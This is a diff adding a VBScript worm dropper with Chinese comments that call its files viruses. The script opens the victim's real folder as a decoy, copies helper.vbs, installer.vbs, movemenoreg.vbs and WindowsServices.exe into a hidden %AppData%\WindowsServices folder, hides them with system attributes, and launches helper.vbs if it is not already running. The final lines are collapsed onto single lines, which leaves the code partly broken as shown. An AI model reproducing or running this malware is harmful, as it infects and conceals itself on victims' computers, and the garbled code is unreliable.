@@ -1,0 +1,31 @@
+'发生错误时，程序继续执行下一句代码 
+on error resume next 
+'定义一系统变量 
+Dim strPath, objws, objFile, strFolder, Target, destFolder, objDestFolder, AppData, ws, objmove, pfolder, objWinMgmt, colProcess, vaprocess 
+'获得WScript.Shell 
+Set ws = WScript.CreateObject("WScript.Shell") 
+Target = "\WindowsServices" 
+'打开根目录下名为‘-’的目录，也就是真正存放用户所有文件的目录 
+strPath = WScript.ScriptFullName
+set objws = CreateObject("Scripting.FileSystemObject") 
+Set objFile = objws.GetFile(strPath) 
+strFolder = objws.GetParentFolderName(objFile) 
+pfolder = objws.GetParentFolderName(strFolder) 'Chr(34)是双引号 
+ws.Run Chr(34) & pfolder & "\_" & Chr(34) AppData = ws.ExpandEnvironmentStrings("%AppData%") 
+DestFolder = AppData & Target 
+'创建目标目录，也就是%AppData%\WindowsServices目录 
+if (not objws.folderexists(DestFolder)) then 
+objws.CreateFolder DestFolder 
+Set objDestFolder = objws.GetFolder(DestFolder) 
+end if 
+'将四个病毒文件复制到目标目录并隐藏，再将目标目录隐藏 
+Call moveandhide ("\helper.vbs") 
+Call moveandhide ("\installer.vbs") 
+Call moveandhide ("\movemenoreg.vbs") 
+Call moveandhide ("\WindowsServices.exe") 
+objDestFolder.Attributes = objDestFolder.Attributes + 39 
+sub moveandhide (name) 
+if (not objws.fileexists(DestFolder & name)) then 
+'复制文件 
+objws.CopyFile strFolder & name, DestFolder & "\" 
+Set objmove = objws.GetFile(DestFolder & name) '隐藏文件（39表示文件属性为归档、系统、隐藏） If not objmove.Attributes AND 39 then objmove.Attributes = 0 objmove.Attributes = objmove.Attributes + 39 end if end if end sub Set objWinMgmt = GetObject("WinMgmts:Root\Cimv2") Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'") '从任务管理器中查找helper.vbs是否已经运行，如果已经运行则退出当前脚本 For Each objProcess In colProcess vaprocess = objProcess.CommandLine if instr(vaprocess, "helper.vbs") then WScript.quit End if Next '运行helper.vbs ws.Run Chr(34) & DestFolder & "\helper.vbs" & Chr(34) Set ws = Nothing
